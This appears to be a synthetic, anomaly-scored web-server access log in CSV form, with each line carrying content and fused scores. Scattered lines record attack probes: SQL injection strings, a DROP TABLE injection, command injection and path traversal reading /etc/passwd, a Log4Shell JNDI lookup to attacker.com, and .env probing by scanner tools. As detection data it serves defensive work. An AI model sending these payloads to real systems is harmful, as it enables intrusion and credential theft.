score_content,score_session,score_fused,score_fused_norm,line
0.2541894018650055,,0.2541894018650055,0.2541894018650055,105.31.138.92 - - [10/Jan/2025:12:09:36 +0000] "GET /assets/app.js HTTP/1.1" 200 10390 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9233580827713013,,1.9233580827713013,1.9233580827713013,212.181.179.155 - - [10/Jan/2025:12:09:38 +0000] "GET /contact HTTP/1.1" 200 10068 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11066.20703125,,11066.20703125,11066.20703125,132.13.174.77 - - [10/Jan/2025:12:09:40 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 500 811 "https://www.google.com/" "python-requests/2.31.0"
23.610078811645508,,23.610078811645508,23.610078811645508,64.25.119.27 - - [10/Jan/2025:12:09:40 +0000] "GET /search?q=camera HTTP/1.1" 200 18126 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.475879669189453,,23.475879669189453,23.475879669189453,96.176.162.241 - - [10/Jan/2025:12:09:40 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 13226 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.957376480102539,,1.957376480102539,1.957376480102539,51.232.166.114 - - [10/Jan/2025:12:09:44 +0000] "GET /about HTTP/1.1" 200 2212 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2191244512796402,,0.2191244512796402,0.2191244512796402,111.211.186.102 - - [10/Jan/2025:12:09:46 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 200 18905 "-" "nikto/2.5.0"
0.23522701859474182,,0.23522701859474182,0.23522701859474182,71.72.115.227 - - [10/Jan/2025:12:09:49 +0000] "GET /assets/app.js HTTP/1.1" 200 6232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.61102867126465,,23.61102867126465,23.61102867126465,106.226.141.123 - - [10/Jan/2025:12:09:53 +0000] "GET /api/product?id=123 HTTP/1.1" 204 16447 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.629108428955078,,23.629108428955078,23.629108428955078,64.162.206.140 - - [10/Jan/2025:12:09:55 +0000] "GET /search?q=phone HTTP/1.1" 200 17329 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.542375564575195,,23.542375564575195,23.542375564575195,129.83.100.70 - - [10/Jan/2025:12:10:00 +0000] "GET /search?q=headphones HTTP/1.1" 200 18635 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30112.462890625,,30112.462890625,30112.462890625,15.208.254.121 - - [10/Jan/2025:12:10:02 +0000] "GET / HTTP/1.1" 403 575 "https://example.com/" "python-requests/2.31.0"
0.24374328553676605,,0.24374328553676605,0.24374328553676605,69.137.209.203 - - [10/Jan/2025:12:10:06 +0000] "GET /assets/app.js HTTP/1.1" 200 8002 "-" "sqlmap/1.5.10#stable"
23.561323165893555,,23.561323165893555,23.561323165893555,46.61.152.82 - - [10/Jan/2025:12:10:07 +0000] "GET /search?q=laptop HTTP/1.1" 200 5792 "https://example.com/" "sqlmap/1.5.10#stable"
30135.53125,,30135.53125,30135.53125,37.145.243.49 - - [10/Jan/2025:12:10:11 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 429 1154 "https://twitter.com/" "nikto/2.5.0"
0.32255980372428894,,0.32255980372428894,0.32255980372428894,155.57.6.135 - - [10/Jan/2025:12:10:13 +0000] "GET /index.html HTTP/1.1" 200 7722 "-" "Wget/1.20.3 (linux-gnu)"
4.826736927032471,,4.826736927032471,4.826736927032471,184.46.236.206 - - [10/Jan/2025:12:10:15 +0000] "GET /api/products HTTP/1.1" 304 11265 "-" "curl/7.68.0"
3.1914260387420654,,3.1914260387420654,3.1914260387420654,221.94.246.19 - - [10/Jan/2025:12:10:15 +0000] "GET /../../etc/passwd HTTP/1.1" 304 17345 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
23.570640563964844,,23.570640563964844,23.570640563964844,188.243.112.203 - - [10/Jan/2025:12:10:19 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 5261 "https://example.com/" "nikto/2.5.0"
1.9562731981277466,,1.9562731981277466,1.9562731981277466,209.45.97.79 - - [10/Jan/2025:12:10:20 +0000] "GET /profile HTTP/1.1" 200 19398 "https://example.com/" "sqlmap/1.5.10#stable"
30113.626953125,,30113.626953125,30113.626953125,101.218.198.248 - - [10/Jan/2025:12:10:21 +0000] "GET / HTTP/1.1" 429 1173 "-" "python-requests/2.31.0"
23.559772491455078,,23.559772491455078,23.559772491455078,240.128.37.85 - - [10/Jan/2025:12:10:22 +0000] "GET /api/product?id=123 HTTP/1.1" 201 3511 "-" "sqlmap/1.5.10#stable"
1.8235970735549927,,1.8235970735549927,1.8235970735549927,211.182.172.164 - - [10/Jan/2025:12:10:23 +0000] "GET /dashboard HTTP/1.1" 200 3007 "https://example.com/" "sqlmap/1.5.10#stable"
23.41767692565918,,23.41767692565918,23.41767692565918,90.66.202.28 - - [10/Jan/2025:12:10:26 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11066.33203125,,11066.33203125,11066.33203125,127.226.97.90 - - [10/Jan/2025:12:10:29 +0000] "GET /search?q=phone HTTP/1.1" 500 847 "https://news.ycombinator.com/" "python-requests/2.31.0"
23.556859970092773,,23.556859970092773,23.556859970092773,205.217.9.76 - - [10/Jan/2025:12:10:29 +0000] "GET /api/product?id=123 HTTP/1.1" 200 2515 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0047152042388916,,2.0047152042388916,2.0047152042388916,42.188.20.141 - - [10/Jan/2025:12:10:31 +0000] "GET /about HTTP/1.1" 200 12403 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.47569465637207,,26.47569465637207,26.47569465637207,242.168.43.156 - - [10/Jan/2025:12:10:35 +0000] "GET /search?q=headphones HTTP/1.1" 302 14233 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
11066.2021484375,,11066.2021484375,11066.2021484375,179.142.185.237 - - [10/Jan/2025:12:10:35 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 500 838 "https://example.com/" "python-requests/2.31.0"
0.36181047558784485,,0.36181047558784485,0.36181047558784485,216.126.40.14 - - [10/Jan/2025:12:10:37 +0000] "GET /index.html HTTP/1.1" 200 18111 "-" "curl/7.68.0"
23.818117141723633,,23.818117141723633,23.818117141723633,53.44.164.75 - - [10/Jan/2025:12:10:40 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 943 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.57561683654785,,23.57561683654785,23.57561683654785,24.165.140.100 - - [10/Jan/2025:12:10:40 +0000] "GET /search?q=laptop HTTP/1.1" 200 8783 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.598194122314453,,23.598194122314453,23.598194122314453,120.68.58.215 - - [10/Jan/2025:12:10:43 +0000] "GET /search?q=camera HTTP/1.1" 200 14509 "https://twitter.com/" "curl/7.68.0"
1.9286880493164062,,1.9286880493164062,1.9286880493164062,207.139.106.249 - - [10/Jan/2025:12:10:43 +0000] "GET /contact HTTP/1.1" 200 11365 "https://www.google.com/" "python-requests/2.31.0"
30110.955078125,,30110.955078125,30110.955078125,248.138.176.222 - - [10/Jan/2025:12:10:47 +0000] "GET /.env HTTP/1.1" 400 857 "https://twitter.com/" "nikto/2.5.0"
1.9568923711776733,,1.9568923711776733,1.9568923711776733,129.147.231.133 - - [10/Jan/2025:12:10:48 +0000] "GET /about HTTP/1.1" 200 1237 "https://twitter.com/" "python-requests/2.31.0"
0.16693876683712006,,0.16693876683712006,0.16693876683712006,249.55.207.50 - - [10/Jan/2025:12:10:49 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 200 5577 "-" "curl/7.68.0"
1.7234183549880981,,1.7234183549880981,1.7234183549880981,214.153.67.82 - - [10/Jan/2025:12:10:52 +0000] "GET /server-status HTTP/1.1" 200 4945 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30112.0625,,30112.0625,30112.0625,118.235.224.4 - - [10/Jan/2025:12:10:55 +0000] "GET /dashboard HTTP/1.1" 401 1064 "https://twitter.com/" "sqlmap/1.5.10#stable"
23.578777313232422,,23.578777313232422,23.578777313232422,38.146.151.150 - - [10/Jan/2025:12:10:59 +0000] "GET /search?q=phone HTTP/1.1" 200 5003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30112.248046875,,30112.248046875,30112.248046875,225.106.68.99 - - [10/Jan/2025:12:11:03 +0000] "GET /logout HTTP/1.1" 403 704 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.34565961360931396,,0.34565961360931396,0.34565961360931396,37.159.156.175 - - [10/Jan/2025:12:11:07 +0000] "GET /index.html HTTP/1.1" 200 13304 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
4.738697052001953,,4.738697052001953,4.738697052001953,191.122.236.69 - - [10/Jan/2025:12:11:07 +0000] "GET /dashboard HTTP/1.1" 301 1715 "-" "curl/7.68.0"
1.9814056158065796,,1.9814056158065796,1.9814056158065796,220.179.176.26 - - [10/Jan/2025:12:11:09 +0000] "GET /logout HTTP/1.1" 200 16209 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.5715274810791,,26.5715274810791,26.5715274810791,69.187.107.155 - - [10/Jan/2025:12:11:11 +0000] "GET /search?q=camera HTTP/1.1" 304 10614 "-" "sqlmap/1.5.10#stable"
26.575437545776367,,26.575437545776367,26.575437545776367,223.96.211.15 - - [10/Jan/2025:12:11:12 +0000] "GET /search?q=phone HTTP/1.1" 302 17024 "https://www.google.com/" "python-requests/2.31.0"
23.607423782348633,,23.607423782348633,23.607423782348633,226.146.8.45 - - [10/Jan/2025:12:11:12 +0000] "GET /search?q=laptop HTTP/1.1" 200 17279 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.588611602783203,,23.588611602783203,23.588611602783203,181.51.71.95 - - [10/Jan/2025:12:11:12 +0000] "GET /search?q=camera HTTP/1.1" 200 11908 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
4.833339214324951,,4.833339214324951,4.833339214324951,96.126.153.115 - - [10/Jan/2025:12:11:15 +0000] "GET /contact HTTP/1.1" 301 8027 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9168224334716797,,1.9168224334716797,1.9168224334716797,192.213.177.24 - - [10/Jan/2025:12:11:19 +0000] "GET /profile HTTP/1.1" 200 8575 "-" "curl/7.68.0"
30134.189453125,,30134.189453125,30134.189453125,58.174.53.69 - - [10/Jan/2025:12:11:22 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 401 1325 "https://twitter.com/" "dirb/2.22"
2.1775853633880615,,2.1775853633880615,2.1775853633880615,166.45.154.206 - - [10/Jan/2025:12:11:22 +0000] "GET / HTTP/1.1" 200 4435 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.893310546875,,4.893310546875,4.893310546875,109.230.97.219 - - [10/Jan/2025:12:11:24 +0000] "GET /logout HTTP/1.1" 302 9123 "https://news.ycombinator.com/" "curl/7.68.0"
4.8893961906433105,,4.8893961906433105,4.8893961906433105,150.27.2.131 - - [10/Jan/2025:12:11:26 +0000] "GET /logout HTTP/1.1" 301 13113 "https://example.com/" "sqlmap/1.5.10#stable"
1.927211046218872,,1.927211046218872,1.927211046218872,124.17.87.254 - - [10/Jan/2025:12:11:30 +0000] "GET /logout HTTP/1.1" 200 3642 "https://example.com/" "curl/7.68.0"
1.9841421842575073,,1.9841421842575073,1.9841421842575073,196.62.231.15 - - [10/Jan/2025:12:11:32 +0000] "GET /logout HTTP/1.1" 200 17050 "https://news.ycombinator.com/" "python-requests/2.31.0"
3.1895318031311035,,3.1895318031311035,3.1895318031311035,76.67.233.108 - - [10/Jan/2025:12:11:37 +0000] "GET /assets/app.css HTTP/1.1" 302 16397 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
23.44267463684082,,23.44267463684082,23.44267463684082,176.137.164.201 - - [10/Jan/2025:12:11:42 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 7386 "https://example.com/" "nikto/2.5.0"
30110.712890625,,30110.712890625,30110.712890625,47.76.25.121 - - [10/Jan/2025:12:11:46 +0000] "GET /assets/app.js HTTP/1.1" 400 1143 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30112.037109375,,30112.037109375,30112.037109375,168.23.57.91 - - [10/Jan/2025:12:11:51 +0000] "GET /assets/app.js HTTP/1.1" 429 687 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.8906912803649902,,1.8906912803649902,1.8906912803649902,76.119.218.31 - - [10/Jan/2025:12:11:54 +0000] "GET /dashboard HTTP/1.1" 200 19287 "-" "Wget/1.20.3 (linux-gnu)"
1.9787994623184204,,1.9787994623184204,1.9787994623184204,129.31.223.175 - - [10/Jan/2025:12:11:59 +0000] "GET /about HTTP/1.1" 200 6474 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
0.21402274072170258,,0.21402274072170258,0.21402274072170258,88.105.253.146 - - [10/Jan/2025:12:12:01 +0000] "GET /assets/app.css HTTP/1.1" 200 6663 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
3.252363681793213,,3.252363681793213,3.252363681793213,86.162.253.46 - - [10/Jan/2025:12:12:03 +0000] "GET /assets/app.js HTTP/1.1" 304 16077 "-" "curl/7.68.0"
4.760517120361328,,4.760517120361328,4.760517120361328,148.196.41.126 - - [10/Jan/2025:12:12:03 +0000] "GET /api/products HTTP/1.1" 302 5624 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.623943328857422,,23.623943328857422,23.623943328857422,99.2.10.137 - - [10/Jan/2025:12:12:07 +0000] "GET /search?q=phone HTTP/1.1" 200 15743 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.8442631959915161,,1.8442631959915161,1.8442631959915161,161.188.64.58 - - [10/Jan/2025:12:12:07 +0000] "GET /api/products HTTP/1.1" 200 235 "https://example.com/" "sqlmap/1.5.10#stable"
0.5389040112495422,,0.5389040112495422,0.5389040112495422,43.17.211.12 - - [10/Jan/2025:12:12:09 +0000] "GET /.env HTTP/1.1" 200 10130 "https://example.com/" "python-requests/2.31.0"
1.8312686681747437,,1.8312686681747437,1.8312686681747437,88.231.126.92 - - [10/Jan/2025:12:12:12 +0000] "GET /dashboard HTTP/1.1" 200 4484 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.384538650512695,,26.384538650512695,26.384538650512695,55.188.6.151 - - [10/Jan/2025:12:12:15 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 302 4399 "-" "curl/7.68.0"
0.3260509669780731,,0.3260509669780731,0.3260509669780731,198.137.160.13 - - [10/Jan/2025:12:12:17 +0000] "GET /index.html HTTP/1.1" 200 8481 "-" "python-requests/2.31.0"
1.965356707572937,,1.965356707572937,1.965356707572937,107.114.98.32 - - [10/Jan/2025:12:12:22 +0000] "GET /admin HTTP/1.1" 200 3894 "https://news.ycombinator.com/" "python-requests/2.31.0"
2.172203779220581,,2.172203779220581,2.172203779220581,170.134.70.160 - - [10/Jan/2025:12:12:27 +0000] "GET / HTTP/1.1" 200 3408 "https://www.google.com/" "python-requests/2.31.0"
1.8937186002731323,,1.8937186002731323,1.8937186002731323,73.30.201.28 - - [10/Jan/2025:12:12:30 +0000] "GET /contact HTTP/1.1" 200 3957 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
30112.16796875,,30112.16796875,30112.16796875,92.181.105.76 - - [10/Jan/2025:12:12:34 +0000] "GET /login HTTP/1.1" 400 413 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.7828755378723145,,4.7828755378723145,4.7828755378723145,85.61.1.4 - - [10/Jan/2025:12:12:38 +0000] "GET /api/products HTTP/1.1" 301 15850 "-" "sqlmap/1.5.10#stable"
23.477968215942383,,23.477968215942383,23.477968215942383,200.131.20.186 - - [10/Jan/2025:12:12:38 +0000] "GET /search?q=headphones HTTP/1.1" 200 3051 "-" "sqlmap/1.5.10#stable"
11066.4453125,,11066.4453125,11066.4453125,68.119.13.26 - - [10/Jan/2025:12:12:40 +0000] "GET /search?q=camera HTTP/1.1" 502 606 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.8281593322753906,,1.8281593322753906,1.8281593322753906,25.218.195.228 - - [10/Jan/2025:12:12:42 +0000] "GET /dashboard HTTP/1.1" 200 3897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.26962223649024963,,0.26962223649024963,0.26962223649024963,245.160.69.225 - - [10/Jan/2025:12:12:43 +0000] "GET /assets/app.js HTTP/1.1" 200 14443 "-" "sqlmap/1.5.10#stable"
0.2652105689048767,,0.2652105689048767,0.2652105689048767,247.117.70.214 - - [10/Jan/2025:12:12:45 +0000] "GET /assets/app.js HTTP/1.1" 200 13215 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.21485194563865662,,0.21485194563865662,0.21485194563865662,252.242.217.41 - - [10/Jan/2025:12:12:48 +0000] "GET /assets/app.js HTTP/1.1" 200 2021 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.591041564941406,,23.591041564941406,23.591041564941406,200.92.157.8 - - [10/Jan/2025:12:12:52 +0000] "GET /search?q=camera HTTP/1.1" 200 12543 "https://www.google.com/" "sqlmap/1.5.10#stable"
30112.2109375,,30112.2109375,30112.2109375,12.17.67.168 - - [10/Jan/2025:12:12:55 +0000] "GET /contact HTTP/1.1" 403 902 "-" "curl/7.68.0"
11066.33203125,,11066.33203125,11066.33203125,224.87.133.134 - - [10/Jan/2025:12:13:00 +0000] "GET /api/product?id=123 HTTP/1.1" 500 1371 "https://twitter.com/" "sqlmap/1.5.10#stable"
23.60369300842285,,23.60369300842285,23.60369300842285,39.215.212.143 - - [10/Jan/2025:12:13:00 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12711 "-" "python-requests/2.31.0"
0.2731819748878479,,0.2731819748878479,0.2731819748878479,219.127.223.43 - - [10/Jan/2025:12:13:00 +0000] "GET /assets/app.js HTTP/1.1" 200 15477 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.983314871788025,,1.983314871788025,1.983314871788025,141.165.97.104 - - [10/Jan/2025:12:13:02 +0000] "GET /login HTTP/1.1" 200 7397 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.604700088500977,,23.604700088500977,23.604700088500977,115.81.31.252 - - [10/Jan/2025:12:13:05 +0000] "GET /search?q=camera HTTP/1.1" 200 16433 "-" "Wget/1.20.3 (linux-gnu)"
0.38103407621383667,,0.38103407621383667,0.38103407621383667,212.24.203.155 - - [10/Jan/2025:12:13:05 +0000] "GET /index.html HTTP/1.1" 200 105 "https://example.com/" "python-requests/2.31.0"
30135.529296875,,30135.529296875,30135.529296875,212.14.210.58 - - [10/Jan/2025:12:13:09 +0000] "GET /search?q=camera HTTP/1.1" 429 744 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
26.467498779296875,,26.467498779296875,26.467498779296875,184.116.30.25 - - [10/Jan/2025:12:13:13 +0000] "GET /search?q=headphones HTTP/1.1" 302 12004 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.9676953554153442,,1.9676953554153442,1.9676953554153442,180.28.12.230 - - [10/Jan/2025:12:13:13 +0000] "GET /logout HTTP/1.1" 200 12351 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.58650016784668,,23.58650016784668,23.58650016784668,49.31.239.219 - - [10/Jan/2025:12:13:14 +0000] "GET /search?q=phone HTTP/1.1" 200 6519 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
4.750125408172607,,4.750125408172607,4.750125408172607,194.107.12.238 - - [10/Jan/2025:12:13:17 +0000] "GET /api/products HTTP/1.1" 302 3631 "https://twitter.com/" "sqlmap/1.5.10#stable"
23.613964080810547,,23.613964080810547,23.613964080810547,245.130.35.247 - - [10/Jan/2025:12:13:17 +0000] "GET /search?q=camera HTTP/1.1" 200 19410 "-" "Wget/1.20.3 (linux-gnu)"
30134.2265625,,30134.2265625,30134.2265625,237.131.200.236 - - [10/Jan/2025:12:13:21 +0000] "GET /search?q=phone HTTP/1.1" 400 989 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.26335644721984863,,0.26335644721984863,0.26335644721984863,156.226.83.130 - - [10/Jan/2025:12:13:22 +0000] "GET /assets/app.css HTTP/1.1" 200 19778 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
23.59837532043457,,23.59837532043457,23.59837532043457,249.76.116.207 - - [10/Jan/2025:12:13:26 +0000] "GET /api/product?id=123 HTTP/1.1" 200 11334 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30112.107421875,,30112.107421875,30112.107421875,221.81.183.189 - - [10/Jan/2025:12:13:29 +0000] "GET /logout HTTP/1.1" 400 1121 "https://www.google.com/" "python-requests/2.31.0"
4.850559711456299,,4.850559711456299,4.850559711456299,252.182.167.250 - - [10/Jan/2025:12:13:30 +0000] "GET /logout HTTP/1.1" 301 4447 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.803621292114258,,4.803621292114258,4.803621292114258,144.123.150.147 - - [10/Jan/2025:12:13:34 +0000] "GET /dashboard HTTP/1.1" 302 11642 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
30112.23828125,,30112.23828125,30112.23828125,207.4.134.28 - - [10/Jan/2025:12:13:39 +0000] "GET /logout HTTP/1.1" 403 865 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2558828890323639,,0.2558828890323639,0.2558828890323639,252.74.175.65 - - [10/Jan/2025:12:13:40 +0000] "GET /wp-login.php HTTP/1.1" 200 5373 "-" "curl/7.68.0"
4.743937969207764,,4.743937969207764,4.743937969207764,92.209.116.27 - - [10/Jan/2025:12:13:45 +0000] "GET /api/products HTTP/1.1" 302 1158 "https://twitter.com/" "python-requests/2.31.0"
23.578868865966797,,23.578868865966797,23.578868865966797,178.171.13.238 - - [10/Jan/2025:12:13:46 +0000] "GET /search?q=laptop HTTP/1.1" 200 9525 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
11044.2109375,,11044.2109375,11044.2109375,4.191.65.52 - - [10/Jan/2025:12:13:49 +0000] "GET /dashboard HTTP/1.1" 500 110 "https://news.ycombinator.com/" "python-requests/2.31.0"
4.8908514976501465,,4.8908514976501465,4.8908514976501465,190.155.51.199 - - [10/Jan/2025:12:13:50 +0000] "GET /profile HTTP/1.1" 302 18011 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.9753540754318237,,1.9753540754318237,1.9753540754318237,189.132.31.97 - - [10/Jan/2025:12:13:52 +0000] "GET /about HTTP/1.1" 200 5794 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.22247806191444397,,0.22247806191444397,0.22247806191444397,2.85.120.182 - - [10/Jan/2025:12:13:54 +0000] "GET /assets/app.css HTTP/1.1" 200 8456 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.3097777366638184,,3.3097777366638184,3.3097777366638184,126.203.147.141 - - [10/Jan/2025:12:13:55 +0000] "GET /index.html HTTP/1.1" 304 9968 "-" "curl/7.68.0"
30135.525390625,,30135.525390625,30135.525390625,18.202.130.41 - - [10/Jan/2025:12:14:00 +0000] "GET /api/product?id=123 HTTP/1.1" 429 1066 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.9098587036132812,,1.9098587036132812,1.9098587036132812,170.85.85.93 - - [10/Jan/2025:12:14:04 +0000] "GET /profile HTTP/1.1" 200 7091 "https://www.google.com/" "curl/7.68.0"
2.2102270126342773,,2.2102270126342773,2.2102270126342773,115.62.232.165 - - [10/Jan/2025:12:14:08 +0000] "GET / HTTP/1.1" 200 11437 "https://twitter.com/" "python-requests/2.31.0"
1.8277274370193481,,1.8277274370193481,1.8277274370193481,99.66.139.186 - - [10/Jan/2025:12:14:09 +0000] "GET /dashboard HTTP/1.1" 200 3815 "-" "curl/7.68.0"
1.948106050491333,,1.948106050491333,1.948106050491333,115.125.12.76 - - [10/Jan/2025:12:14:13 +0000] "GET /profile HTTP/1.1" 200 16770 "https://www.google.com/" "sqlmap/1.5.10#stable"
